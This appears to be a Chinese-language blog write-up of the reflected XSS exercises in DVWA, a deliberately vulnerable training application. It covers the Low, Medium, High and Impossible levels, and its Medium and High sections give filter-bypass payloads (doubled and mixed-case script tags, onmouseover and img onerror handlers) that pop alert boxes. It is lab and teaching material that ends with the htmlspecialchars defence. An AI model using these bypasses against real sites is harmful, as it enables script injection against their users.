---
title: DVWA-xss‘反射型’手记
date: 2018-10-10 15:22:58
tags: [DVWA,XSS]
categories: XSS
---

# DVWA-XSS‘反射型’手记

---

## LOW

### Source:

![001](/img/xss/dvwa/Reflected/low_001.png)

### Analysis:	

	没有进行任何过滤,直接用弹窗测试漏洞存在。

### Process:

![002](/img/xss/dvwa/Reflected/low_002.png)

![003](/img/xss/dvwa/Reflected/low_003.png)

## MEDIUM

### Source:

![004](/img/xss/dvwa/Reflected/medium_001.png)

### Analysis:	

	对script替换成空。可以采用多种方法绕过。
	1. 双写
		<sc<script>ript>alert('双写')</script>
	2. 添加空格或换行
		添加空格
		<script >alert('添加空格')</script>
		
		添加换行
		<script 
		>alert('添加换行')</script>
	 3. 替换大小写
	 	<Script>alert('修改S')</script>

### Process:

1. 双写

![005](/img/xss/dvwa/Reflected/medium_t001.png)

2. 添加空格

![006](/img/xss/dvwa/Reflected/medium_t002.png)

​       		添加换行

![007](/img/xss/dvwa/Reflected/medium_t002_1.png)

3. 替换大小写

   ![008](/img/xss/dvwa/Reflected/medium_t003.png)



## HIGH

### Source:

![009](/img/xss/dvwa/Reflected/high_001.png)

### Analysis:	

```
过滤了<script,检查了大小写。就算是<s1c2r3i4p5t也全替为空。
对于这种情况不使用script就行了。
1.事件触发执行javascript
	<a href=# onmouseover=alert('事件')>ClickHere</a>
2.Src属性
	<img src=x onerror=alert('Src属性');>
```

### Process:

1.事件触发执行javascript

![010](/img/xss/dvwa/Reflected/high_002.png)

2.Src属性

![011](/img/xss/dvwa/Reflected/high_003.png)

## IMPOSSIBLE

### Source:

![012](/img/xss/dvwa/Reflected/impossible_001.png)

### Analysis:	


    htmlspecialchars 将特殊字符转换为 HTML 实体
    & (& 符号)	&amp;
    " (双引号)	&quot;，除非设置了 ENT_NOQUOTES
    ' (单引号)	&#039; 
    < (小于)	&lt;
    > (大于)	&gt;
    
    可以看到，Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，
    防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。






